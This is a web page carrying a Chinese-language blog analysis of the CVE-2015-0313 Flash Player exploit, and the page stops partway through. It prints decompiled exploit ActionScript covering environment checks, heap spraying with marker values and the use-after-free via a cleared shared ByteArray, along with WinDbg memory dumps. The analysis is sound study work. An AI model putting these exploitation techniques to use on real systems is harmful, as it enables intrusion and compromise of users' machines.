<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>CVE-2015-0313:New Flash Exploit Analysis - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="概述" />
<meta name="keywords" content="ApplicationDomain,ByteArray,ByteArray.Clear(),ByteArray.shareable,cve-2015-0313,domainMemory,DSRU15-004,Flash Vulnerability Exploit,heap spray,littleEndian,tedjoy,控制EIP,泄露基址" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/5759.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-5759 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/articles">文章</a> &gt; <a href="https://www.secpulse.com/archives/category/articles/reverse-break" rel="category tag">逆向破解</a> &gt;  正文 </nav><article id="post-5759" class="post-5759 post type-post status-publish format-standard hentry category-reverse-break tag-applicationdomain tag-bytearray tag-bytearray-clear tag-bytearray-shareable tag-cve-2015-0313 tag-domainmemory tag-dsru15-004 tag-flash-vulnerability-exploit tag-heap-spray tag-littleendian tag-tedjoy tag-eip tag-2444">
	<header class="single-header">
		<h1>CVE-2015-0313:New Flash Exploit Analysis</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2015 /4/5 11:16</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">3,674</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/5759.html#respond">沙发</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<h2><strong>概述</strong></h2>
<p>最近Flash Player报出来很多高危害的漏洞，一时间火了起来，目测Flash将迎来一大波高潮。</p>
<p>我也来凑个热闹，在这里分享一篇Flash Vulnerability Exploit！另可以参考安全脉搏之前发的一篇《<a href="http://www.secpulse.com/archives/4490.html">Flash严重漏洞（CVE-2015-0311）详细技术分析（附上exp）</a>》</p>
<p>正好没怎么搞过flash，就拿cve-2015-0313来练练手。</p>
<p>我们还是开始正题吧！</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/04/flash-html5-225-e1297287594566.jpg"><img class="alignnone wp-image-5794" src="http://www.secpulse.com/wp-content/uploads/2015/04/flash-html5-225-e1297287594566.jpg" alt="flash-html5-225-e1297287594566" width="650" height="365" /></a></p>
<h2><strong>环境</strong></h2>
<p>漏洞：cve-2015-0313</p>
<p>系统：Windows 7 + IE11 + flash player 16.0.0.296（调试版，该版本和更早版本将触发漏洞）</p>
<p>概要：Exploit, ASLR,ROP,控制EIP</p>
<h2><strong>漏洞成因简述</strong></h2>
<p>该漏洞是趋势科技在2月份的时候在野外抓到的0day，我们可以在<a href="http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-cve-2015-0313-the-new-flash-player-zero-day/" target="_blank">这里</a>看到趋势对该漏洞的大概分析。</p>
<p>先在这里简单分析下漏洞成因，前面趋势的blog也已经提到。我将在这里主要讲该漏洞如何利用的。</p>
<p><span style="color: #ff6600;"><strong>Worker：</strong></span></p>
<p>在分析漏洞之前我们先介绍下ActionScript 3.0中的Worker，简单来说，Worker就是再你运行的主SWF中再运行另一个SWF程序（是不是有点像多线程），所以说这里面有一个很重要的部分就是多个Worker之间共享数据，所以通过ByteArray.shareable属性来实现在worker之间的共享内存。该属性将在worker之间共享ByteArray的数据。大家可以在<a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Worker.html" target="_blank">这里</a>看到更多信息。</p>
<p><span style="color: #ff6600;"><strong>domainMemory:</strong></span></p>
<p>大家都应该知道该属性被用来指定ApplicationDomain中执行全局内存操作的对象，domainMemory继承于ByteArray。</p>
<p><span style="color: #ff6600;"><strong>漏洞成因：</strong></span></p>
<p>该漏洞正好发生在worker和domainMemory之间。漏洞触发的流程如下：</p>
<p>1)在主worker中创建子worker，然后worker间共享ByteArray数据</p>
<p>2)在主worker中将共享的ByteArray对象设置为domainMemory</p>
<p>3)在子worker中通过ByteArray.Clear将共享的ByteArray内存清除</p>
<p>4)但是这时候domainMemory任然可以引用共享的内存区域，这是因为子worker调用clear清除内存的时候没有通知domainMemory修改对共享的引用。这就是bug所在。</p>
<p>写到这里相信有心之人已经能够自己构造poc了。(怕</p>
<p>&nbsp;</p>
<h2><strong>Exploit技术细节</strong></h2>
<p>前面分析了漏洞触发原因，接下来我们重点分析下该样本是如何利用该漏洞的。（该样本使用了很多技巧来绕开杀软和增加分析的难度，这里先不说这些，大家肯定更关心是如何利用的）</p>
<p><span style="color: #ff6600;"><strong>确定攻击环境：</strong></span></p>
<p>通过以下代码获得Flash Player的版本</p>
<pre class="lang:python decode:true ">var _loc7_:String = Capabilities.version.toLowerCase();</pre>
<p>&nbsp;</p>
<p>如果不是window,直接退出</p>
<pre class="lang:python decode:true ">var _loc6_:String = _loc7_.substr(0,4);
if(_loc6_ != "win ")
{
return 0;
}</pre>
<p>&nbsp;</p>
<p>然后再针对Flash Player版本号进行判断</p>
<pre class="lang:python decode:true ">var 
_loc3_:Boolean = this.var_13 &gt;= 130000259 &amp;&amp; this.var_13 &lt; 140000000 || this.var_13 == 150000246 || this.var_13 &gt;= 160000235;</pre>
<p>&nbsp;</p>
<p>以上代码中的160000235代表版本号16.0.0.235，如果_loc3_的结果为flase便退出</p>
<p><span style="color: #ff6600;"><strong>下载URL：</strong></span></p>
<p>该样本获取javascript传递的参数来获取下载URL</p>
<pre class="lang:python decode:true ">_loc14_ = root.loaderInfo.parameters.exec;</pre>
<p>&nbsp;</p>
<p>然后再经过一系列的变换得到真正的URL，这里就不累述</p>
<p>之后会把编码后的shellcode（字符串的形式）写入ByteArray</p>
<p><span style="color: #ff6600;"><strong>布局内存：</strong></span></p>
<p>接下来，该exp开始执行最重要的步骤，通过Vector.&lt;Object&gt;来heap spray，控制内存布局，类似代码如下：</p>
<pre class="lang:python decode:true ">this.var_48 = new Vector.&lt;Object&gt;(0x1020);
_loc2_ = 0;
while(_loc2_ &lt; this.aNmlxJ)
{
loc16_ = new ByteArray();
_loc16_.endian = "littleEndian";
this.var_48[_loc2_] = _loc16_;
_loc2_++;
}</pre>
<p>&nbsp;</p>
<p>然后就是填充每个Vector元素，该Exp用ByteArray来填充</p>
<pre class="lang:python decode:true ">g_bt = new ByteArray();
g_bt.shareable = true;
g_bt.endian = "littleEndian";
_loc2_ = 0;
while(_loc2_ &lt; this.vecLength)
{
   if(_loc2_ != 817)                                        ;
   {
      _loc16_ =this.var_48[_loc2_] as ByteArray;
      _loc16_.length = 0x2000;
      wIntInByteArr(_loc16_,0xcccccccc);      ;向ByteArray写入0xcccccccc
      _loc16_.writeInt(0xbabefac0);                 ;写入标记
      _loc16_.writeInt(0xbabefac1);
      _loc16_.writeInt(_loc2_);
      _loc16_.writeInt(0xbabefac3);
   }
   else
   {
      g_bt.length = 0x2000;
      wIntInByteArr(g_bt,0x33333333);          ;写入0x33333333
   }
   _loc2_++;
}</pre>
<p>&nbsp;</p>
<p>如上代码所示，this.var_48[817] 并没有分配实例，“取而代之”的是g_bt:ByteArray，同样分配了0x2000字节的大小。</p>
<p>这时候我们可以看看内存中的布局情况，不过首先我们先看下ByteArray在内存中的数据结构。</p>
<p>在本例中g_bt对象实例的地址是ab22581，但是这不是真是的内存地址，这是因为AVM在操作数据时，都是以atom为基本类型，地址的最后3 bits百村了对象指针的信息。</p>
<p>&nbsp;</p>
<pre class="lang:python decode:true ">Untagged       = 000 (0)
    Object        = 001 (1)
    String         = 010 (2)
    Namespace    = 011 (3)
    "undefined"   = 100 (4)
    Boolean      = 101 (5)
    Integer       = 110 (6)
    Number       = 111 (7)</pre>
<p>&nbsp;</p>
<p>所以，我们需要经过 “Object address &amp; 0xfffffff8” 的操作来得到真正的对象地址。</p>
<p>g_bt对象实例的真实地址是ab22580。现在来看下内存结构</p>
<pre class="lang:python decode:true ">0:027&gt; dd ab22580
0ab22580  65b6af90 00000004 08c913f8 0ab38940
0ab22590  0ab2259c 00000040 00000000 65b6af40
0ab225a0  65b6af4c 65b6af3c 65bbacc8 08ea5080
0ab225b0  08cd9000 0ab1bb38 00000000 00000000
0ab225c0  65b89164 0ab21500 00000001 00000000
0ab225d0  65b6af34 00000003 00000001 00000000</pre>
<p>&nbsp;</p>
<p>也许想要把整个结构逆出来确实比较难，但是我们并不需要关心这么多，只需要关心最重要的部分。</p>
<p>在偏移0x44处有个指针，我们再来看下该指针指向的内存区域</p>
<pre class="lang:python decode:true ">0:027&gt; dd 0ab21500 
0ab21500  65b6a4c4 00000001 0be97000 00002000
0ab21510  00002000 00000000 65b5e5b8 0c412000</pre>
<p>&nbsp;</p>
<p>事实上，在偏移0x8处的指针指向ByteArray对象存储的数据其实位置</p>
<pre class="lang:python decode:true ">0:027&gt; dd 0be97000 
0be97000  33333333 33333333 33333333 33333333
0be97010  33333333 33333333 33333333 33333333
0be97020  33333333 33333333 33333333 33333333
0be97030  33333333 33333333 33333333 33333333
0be97040  33333333 33333333 33333333 33333333
0be97050  33333333 33333333 33333333 33333333
0be97060  33333333 33333333 33333333 33333333
0be97070  33333333 33333333 33333333 33333333</pre>
<p>&nbsp;</p>
<p>还记得前面代码中写入g_bt的0x33333333么</p>
<p>现在终于找到了g_bt中数据内容的实际地址，我们知道g_bt的length是0x2000，这时我们在来看看g_bt附近的内容是什么。</p>
<pre class="lang:python decode:true ">0:027&gt; dd 0be97000 +2000-20
0be98fe0  33333333 33333333 33333333 33333333
0be98ff0  33333333 33333333 33333333 33333333
0be99000  babefac0 babefac1 00000332 babefac3
0be99010  cccccccc cccccccc cccccccc cccccccc
0be99020  cccccccc cccccccc cccccccc cccccccc
0be99030  cccccccc cccccccc cccccccc cccccccc
0be99040  cccccccc cccccccc cccccccc cccccccc
0be99050  cccccccc cccccccc cccccccc cccccccc</pre>
<p>&nbsp;</p>
<p>这是g_bt + 0x2000附近的内存，看到红色部分的数据是不是很眼熟，对了，这就是前面写入其他ByteArray中的数据，其中0x332（818）便是每个ByteArray在Vector中的序号。</p>
<p>再来看看附近其他地址的内容：</p>
<pre class="lang:python decode:true ">0:027&gt; dd 0be97000 -2000-20
0be94fe0  cccccccc cccccccc cccccccc cccccccc
0be94ff0  cccccccc cccccccc cccccccc cccccccc
0be95000  babefac0 babefac1 00000330 babefac3
0be95010  cccccccc cccccccc cccccccc cccccccc
0be95020  cccccccc cccccccc cccccccc cccccccc
0be95030  cccccccc cccccccc cccccccc cccccccc
0be95040  cccccccc cccccccc cccccccc cccccccc
0be95050  cccccccc cccccccc cccccccc cccccccc</pre>
<p>&nbsp;</p>
<p>跟前面的内容如出一辙，同样是之前写入ByteArray的数据内容，而且序号是0x330(816)。当然如果继续往更前或更后面看情况也是一样的。</p>
<p>所以我们可以知道内存布局的大概情况如下：</p>
<p>&nbsp;</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/04/flash1.png"><img class="alignnone size-full wp-image-5821" src="http://www.secpulse.com/wp-content/uploads/2015/04/flash1.png" alt="flash1" width="858" height="80" /></a></p>
<p>OK，接下来Exp在子worker中同样申请了大量内存</p>
<pre class="lang:python decode:true">_loc4_ = new Vector.&lt;Object&gt;(0x1020);
_loc2_ = 0;
while(_loc2_ &lt; 0x1020)
{
   _loc6_ = new ByteArray();
   _loc6_.endian = "littleEndian";
   _loc6_.length = 0x2000;
   wIntInByteArr(_loc6_,0x35555555);
   _loc4_[_loc2_] = _loc6_;
   _loc2_++;
}</pre>
<p>&nbsp;</p>
<p>然后Exp在子worker中清除共享的ByteArray数据内容，通过调用ByteArray.Clear()</p>
<pre class="lang:python decode:true ">_loc3_ = Worker.current.getSharedProperty("PLusbbEE");
_loc3_.clear();</pre>
<p>&nbsp;</p>
<p>这时前面g_bt指向的数据区域将被清空，同时g_bt的length也将会被置零，但是domainMemory任然持有对该内存区域的引用。</p>
<p>之所以在调用Clear()之前再次堆喷，是为了确保一下代码能顺利占位成功</p>
<pre class="lang:python decode:true ">hIR = new ByteArray();
hIR.length = 0x2000; 
wIntInByteArr(hIR, 0xbbbbbbbb);
hIR.shareable = true;
Worker.current.setSharedProperty("ooYYuaYhx",hIR);</pre>
<p>&nbsp;</p>
<p>这个时候前面的内存布局将有所改变</p>
<p>&nbsp;</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/04/flash21.png"><img class="alignnone size-full wp-image-5819" src="http://www.secpulse.com/wp-content/uploads/2015/04/flash21.png" alt="flash2" width="862" height="80" /></a></p>
<p>并且在worker间共享hIR。</p>
<p>接下来再在主worker中清除Vector中序数为奇数的元素（ByteArray）的数据内容，同时再次调用ByteArray.Clear()清除共享的ByteArray数据。</p>
<pre class="lang:python decode:true ">while(_loc5_ &lt; 0x1020)
{
   if(_loc5_ == 817)    
   {
      this.dataAfterClear.clear();  
   }
   else if(_loc5_ % 2)
   {
      _loc6_ = this.var_48[_loc5_] as ByteArray;
      this.wIntInByteArr(_loc6_,this.num_0xdddddddd);
      _loc6_.clear();               
   }
   _loc5_++;
}</pre>
<p>&nbsp;</p>
<p>这时候前面的内存布局将又有些许变化</p>
<p>&nbsp;</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/04/flash31.png"><img class="alignnone size-full wp-image-5818" src="http://www.secpulse.com/wp-content/uploads/2015/04/flash31.png" alt="flash3" width="854" height="76" /></a></p>
<p>紧接着主worker分配大量Vector&lt;uint&gt;占位</p>
<pre class="lang:python decode:true ">this.objVec = new Vector.&lt;Object&gt;(11540);
_loc4_ = 0;
while(_loc4_ &lt; 11540)
{
   this.objVec[_loc4_] = new Vector.&lt;uint&gt;();
   _loc4_++;
}
_loc4_ = 0;
while(_loc4_ &lt; 11540)
{
   _loc3_ = this.objVec[_loc4_] as Vector.&lt;uint&gt;;
   _loc3_.length = 114;
   _loc3_[0] = this.num_0xfeedbabe;
   _loc3_[1] = _loc4_;
   _loc3_[2] = this.num_0xbabeface;
   _loc4_++;
}</pre>
<p>&nbsp;</p>
<p>先来看下占位之前的内存（布局图中绿色区域）</p>
<pre class="lang:python decode:true ">0:027&gt; dd 0c338000
0c338000  bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb
0c338010  bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb
0c338020  bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb
0c338030  bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb
0c338040  bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb
0c338050  bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb
0c338060  bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb
0c338070  bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb</pre>
<p>&nbsp;</p>
<p>然后再来看看占位成功后的情况</p>
<pre class="lang:python decode:true">0:006&gt; dd 0c338000 
0c338000  00000000 00000000 0c339000 0c335000
0c338010  01f80008 00000000 00000000 67a85e9c
0c338020  00000072 085f9000 feedbabe 00001530
0c338030  babeface 00000000 00000000 00000000
0c338040  00000000 00000000 00000000 00000000
0c338050  00000000 00000000 00000000 00000000
0c338060  00000000 00000000 00000000 00000000
0c338070  00000000 00000000 00000000 00000000</pre>
<p style="text-align: center;"><span style="color: #ff0000;"><strong>Important data 1</strong></span></p>
